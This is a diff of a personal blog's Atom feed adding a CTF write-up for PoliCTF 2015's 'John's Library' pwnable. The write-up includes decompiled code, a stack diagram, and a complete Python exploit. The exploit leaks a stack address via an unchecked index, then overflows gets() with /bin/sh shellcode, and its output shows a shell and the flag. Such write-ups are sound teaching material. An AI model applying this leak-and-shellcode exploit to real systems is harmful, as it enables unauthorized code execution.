@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | morgan_z's blog]]></title>
   <link href="http://morganzz.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://morganzz.github.io/"/>
-  <updated>2015-05-24T13:45:55+08:00</updated>
+  <updated>2015-07-16T17:40:27+08:00</updated>
   <id>http://morganzz.github.io/</id>
   <author>
     <name><![CDATA[morgan]]></name>
@@ -12,6 +12,289 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[PoliCTF 2015 Pwnable150 John's Library Writeup]]></title>
+    <link href="http://morganzz.github.io/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup/"/>
+    <updated>2015-07-15T07:59:02+08:00</updated>
+    <id>http://morganzz.github.io/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup</id>
+    <content type="html"><![CDATA[<p>The server (<a href="https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/pwnable/johns-library">download</a>) is a 32-bit non-stripped binary. When we connect to the server, we got three options:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to the jungle library mate! Try to escape!!&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt; r - read from library
+</span><span class='line'> a - add element
+</span><span class='line'> u - exit</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Let&rsquo;s see what the first two options do:</p>
+
+<!-- more -->
+
+
+<pre><code class="c read_from_library">int read_from_library(int arg_0)
+{
+  int v2; 
+
+  printf("Insert the index of the book you want to read: ");
+  fflush(stdout);
+  __isoc99_scanf("%d", &amp;v2);
+  getchar();
+  printf("%s", len[v2] + arg_0);
+  return fflush(stdout);
+}
+</code></pre>
+
+<pre><code class="c add_element">int add_element_to_library(int a1)
+{
+  int result; 
+  int v2; 
+
+  puts("Hey mate! Insert how long is the book title: ");
+  fflush(stdout);
+  __isoc99_scanf("%d", &amp;v2);
+  getchar();
+  if ( len[num] + v2 &gt; 1024 )
+  {
+    puts("Hey you! what are you trying to do??");
+    fflush(stdout);
+    exit(-1);
+  }
+  ++num;
+  gets((len[num - 1] + a1));
+  result = num;
+  len[num] = len[num - 1] + 1 + v2;
+  return result;
+}
+</code></pre>
+
+<p>Inside add_element_to_library(), we can see that there is a call to gets(), which is a dangerous function. The variable &lsquo;a1&rsquo; is the address of a buffer, which is defined in main(), so naturally we can think of buffer overflow attack. Let&rsquo;s examine the binary more closely inside gdb:</p>
+
+<pre><code>gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+gdb-peda$ 
+</code></pre>
+
+<p>The NX is disabled, so the exploitation becomes straightforward: fill in the buffer (&lsquo;a1&rsquo;) with shellcode, then replace the return address of main() (since the buffer is defined in main()) with the address of the shellcode. After that, we just need to select &ldquo;u - exit&rdquo; to return from main(). Then our shellcode gets executed.</p>
+
+<p>Now the only problem is: how to get the address of the buffer/shellcode.</p>
+
+<p>Inside read_from_library(), there is a call to printf():
+<code>c snippet from read_from_library
+printf("%s", len[v2] + arg_0);
+</code>
+The variable arg_0 is also the address of the buffer defined in main(), and &lsquo;len&rsquo; is a global array of integers. Here we are able to print the content located at the address of the buffer (&lsquo;arg_0&rsquo;) plus an offset (&lsquo;len[v2]&rsquo;). Meanwhile, the offset (&lsquo;len[v2]&rsquo;) can be controlled inside add_element_to_library():
+<code>c snippet from add_element_to_library
+__isoc99_scanf("%d", &amp;v2);
+...
+++num;
+...
+len[num] = len[num - 1] + 1 + v2;
+</code>
+This shows that the current offset is determined in the previous call to add_element_to_library().</p>
+
+<p>With all of those info, we can perform the following steps:</p>
+
+<ul>
+<li>select &ldquo;a - add element&rdquo; to set the offset properly</li>
+<li>select &ldquo;r - read from library&rdquo; to leak the address based on the offset set before and get the address of the buffer</li>
+<li>select &ldquo;a - add element&rdquo; again to set the offset properly (here I choose to reset the offset to 0 )</li>
+<li>select &ldquo;a - add element&rdquo; to send the shellcode concatenated with repeated addresses of the buffer (we need to make this long enough to overwrite the return address of main())</li>
+<li>select &ldquo;u - exit&rdquo; to return from main() so that our shellcode gets executed</li>
+</ul>
+
+
+<p>In order to leak the desired address info,  we need to set the offset correctly in the first step. The call stack will look like this when the function gets() is called:</p>
+
+<pre><code class="plain">+--------------------+
+|         ...        | (higher addresses)
++--------------------+
+
++--------------------+ &lt;-- start of stack frame of main()
+|   return address   | &lt;-- address we want to overwrite
++--------------------+
+|   previous ebp     |
++--------------------+
+|    the buffer      |
++--------------------+
+|       ...          |
++--------------------+
+|    the buffer      |
++--------------------+ &lt;-- the address of the buffer
+
++--------------------+ &lt;-- start of stack frame of add_element_to_library()
+| addr of the buffer | &lt;-- parameter of add_element_to_library()
++--------------------+
+|   return address   | &lt;-- the address of the instruction after calling add_element_to_library() in main() (0x08048622)
++--------------------+
+|   ebp of main()    |
++--------------------+
+|       ...          |
++--------------------+
+|(frame of gets()..) |
++--------------------+
+</code></pre>
+
+<p>Since the stack grows from higher addresses to lower addresses, the offset we need is a negative number, and it can be found easily using gdb. (I leaked ebp of main() to calculate the address of the buffer, but obviously I can use the address of the buffer directly..)</p>
+
+<p>Here are the code the and the result:
+<figure class='code'><figcaption><span> (johns-library.py)</span> <a href='/downloads/code/poli2015/johns-library.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">import</span> <span class="nn">zio</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#T = (&quot;127.0.0.1&quot;,4444)</span>
+</span><span class='line'><span class="n">T</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;library.polictf.it&quot;</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="o">.</span><span class="n">zio</span><span class="p">(</span><span class="n">T</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">off_addr_ebp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">35</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#set offset</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;a</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;title:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_addr_ebp</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;AAAA&quot;</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#get addr</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;r</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;read:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c">#read 1 byte here</span>
+</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span><span class='line'><span class="n">addr_ebp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">res</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">ebp:&quot;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_ebp</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#addr of buffer</span>
+</span><span class='line'><span class="n">addr_buf</span> <span class="o">=</span> <span class="n">addr_ebp</span> <span class="o">-</span> <span class="mi">1037</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;addr buf:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_buf</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#restore num</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;a</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;title:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="n">off_addr_ebp</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">addr_ebp</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x01\x86\x04\x08</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#send shellcode</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;a</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;title:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">&quot;</span> <span class="o">+</span> \
+</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">payload</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#print len(payload),&quot;bytes&quot;</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">addr_buf</span><span class="p">)</span><span class="o">*</span><span class="mi">320</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<pre><code class="plain">alpha@alpha-th:~$ python johns-library.py
+...
+ebp: 0xff81fd98
+addr buf: 0xff81f98b
+
+ r - read from library
+ a - add element
+ u - exit
+a
+Hey mate! Insert how long is the book title: 
+33
+�����
+
+ r - read from library
+ a - add element
+ u - exit
+a
+
+ r - read from library
+ a - add element
+ u - exit
+Hey mate! Insert how long is the book title: 
+2
+���1�Ph//shh/bin��PS���
+                       ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
+
+ r - read from library
+ a - add element
+ u - exit
+u
+id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+cat /home/ctf/flag
+flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DEF CON CTF Qualifier 2015 Wibbly Wobbly Timey Wimey Writeup]]></title>
